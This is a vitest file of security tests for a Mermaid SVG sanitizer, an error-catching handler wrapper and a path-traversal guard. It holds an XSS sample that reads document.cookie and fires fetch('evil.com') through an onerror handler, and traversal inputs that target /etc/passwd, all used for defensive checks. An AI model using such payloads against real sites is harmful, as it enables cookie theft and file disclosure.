/**
 * Security integration tests.
 * Validates that security fixes don't break functionality.
 */

import { describe, it, expect } from "vitest";
import { sanitizeSvg } from "../lib/sanitize.js";

describe("DOMPurify + Mermaid SVG compatibility", () => {
  // Real Mermaid SVG output contains these patterns
  const REAL_MERMAID_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300" width="400" height="300">
    <style>.node rect { fill: #1f2020; stroke: #81B1DB; } .edgeLabel { background-color: #e8e8e8; } .label { color: #ccc; }</style>
    <g class="node" id="flowchart-A-0" transform="translate(200,50)">
      <rect width="120" height="40" rx="5" ry="5" class="label-container"/>
      <g class="label" transform="translate(-40,-12)">
        <foreignObject width="80" height="24">
          <div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Inicio</span></div>
        </foreignObject>
      </g>
    </g>
    <g class="edgePath" id="L-A-B">
      <path class="path" d="M200,70L200,150" marker-end="url(#flowchart-pointEnd)"/>
    </g>
    <defs>
      <marker id="flowchart-pointEnd" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto">
        <path d="M 0 0 L 10 5 L 0 10 z" class="arrowMarkerPath"/>
      </marker>
    </defs>
  </svg>`;

  it("preserves Mermaid SVG structure", () => {
    const clean = sanitizeSvg(REAL_MERMAID_SVG);
    expect(clean).toContain("<rect");
    expect(clean).toContain("Inicio");  // text content preserved
    expect(clean).toContain("<path");
    expect(clean).toContain("<marker");
    expect(clean).toContain("foreignObject"); // Mermaid's text container
  });

  it("preserves SVG attributes", () => {
    const clean = sanitizeSvg(REAL_MERMAID_SVG);
    expect(clean).toContain("viewBox");
    expect(clean).toContain("transform");
    expect(clean).toContain("marker-end");
  });

  it("preserves foreignObject (Mermaid uses this for text)", () => {
    const clean = sanitizeSvg(REAL_MERMAID_SVG);
    expect(clean).toContain("foreignObject");
  });

  it("strips malicious content injected into Mermaid SVG", () => {
    const infected = REAL_MERMAID_SVG.replace("</svg>",
      '<script>document.cookie</script><image onerror="fetch(\'evil.com\')"/></svg>');
    const clean = sanitizeSvg(infected);
    expect(clean).not.toContain("<script>");
    expect(clean).not.toContain("onerror");
    expect(clean).toContain("Inicio");
  });
});

describe("safeHandle wrapper behavior", () => {
  // Simulates the wrapper pattern
  function safeHandle(handler) {
    return async (...args) => {
      try {
        return await handler(...args);
      } catch (err) {
        return { error: err.message };
      }
    };
  }

  it("passes through successful results", async () => {
    const handler = safeHandle(async (_, payload) => ({ ok: true, data: payload.name }));
    const result = await handler(null, { name: "test" });
    expect(result).toEqual({ ok: true, data: "test" });
  });

  it("catches sync errors", async () => {
    const handler = safeHandle(() => { throw new Error("boom"); });
    const result = await handler();
    expect(result.error).toBe("boom");
  });

  it("catches async errors", async () => {
    const handler = safeHandle(async () => { throw new Error("async boom"); });
    const result = await handler();
    expect(result.error).toBe("async boom");
  });

  it("catches TypeError from bad payload", async () => {
    const handler = safeHandle(async (_, payload) => payload.nested.value);
    const result = await handler(null, {});
    expect(result.error).toBeDefined();
  });

  it("preserves handler arguments", async () => {
    const handler = safeHandle(async (event, payload) => ({
      hasEvent: event !== undefined,
      name: payload.name,
    }));
    const result = await handler("evt", { name: "test" });
    expect(result.hasEvent).toBe(true);
    expect(result.name).toBe("test");
  });
});

describe("Path traversal protection", () => {
  const path = require("path");

  function safeResolve(base, ...segments) {
    const resolved = path.resolve(base, ...segments);
    if (!resolved.startsWith(base)) throw new Error("Path traversal detected");
    return resolved;
  }

  it("allows normal paths", () => {
    expect(() => safeResolve("/vault", "pkg", "doc/page.json")).not.toThrow();
  });

  it("blocks ../", () => {
    expect(() => safeResolve("/vault", "../etc/passwd")).toThrow("Path traversal");
  });

  it("blocks absolute paths", () => {
    expect(() => safeResolve("/vault", "/etc/passwd")).toThrow("Path traversal");
  });

  it("blocks encoded traversal", () => {
    // path.resolve handles this natively
    const resolved = path.resolve("/vault", "..%2F..%2Fetc%2Fpasswd");
    expect(resolved.startsWith("/vault")).toBe(true); // stays inside because %2F is literal
  });
});
